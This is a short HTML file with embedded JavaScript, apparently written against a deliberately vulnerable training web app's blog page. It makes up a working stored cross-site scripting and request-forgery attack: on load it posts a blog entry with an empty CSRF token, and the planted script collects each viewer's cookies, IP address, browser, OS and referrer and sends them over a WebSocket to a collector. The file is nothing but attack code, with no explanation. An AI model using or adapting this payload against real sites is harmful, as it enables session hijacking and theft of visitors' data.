<script src="http://code.jquery.com/jquery-1.9.1.js"></script>
<script>
	var script = \'<script src="http://code.jquery.com/jquery-1.9.1.js"><\/script> <script> var websocket = null; var ip_address = null; var port = null; var browser_name = null; var os_name = null; var referrer = null; $(document).ready(function(){ $.getJSON("http://ipinfo.io", function(data){ ip_address = data.ip; }); port = window.location.port; browser_name = navigator.appCodeName; os_name = navigator.platform; referrer = document.referrer; websocket = new WebSocket("ws://localhost:8090/demo/php-socket.php"); websocket.onopen = function(event) { var messageJSON = { cookie: document.cookie, ip_address: ip_address, port: port, browser_name: browser_name, os_name: os_name, referrer: referrer }; websocket.send(JSON.stringify(messageJSON)); } }); <\/script>\';
	$(document).ready(function(){
		$.ajax({
	            type : "POST",
	            url  : "index.php?page=add-to-your-blog.php",
	            data : { "csrf-token": "", "blog_entry" : (script), "add-to-your-blog-php-submit-button": "Save Blog Entry"},
        	});
	});
</script>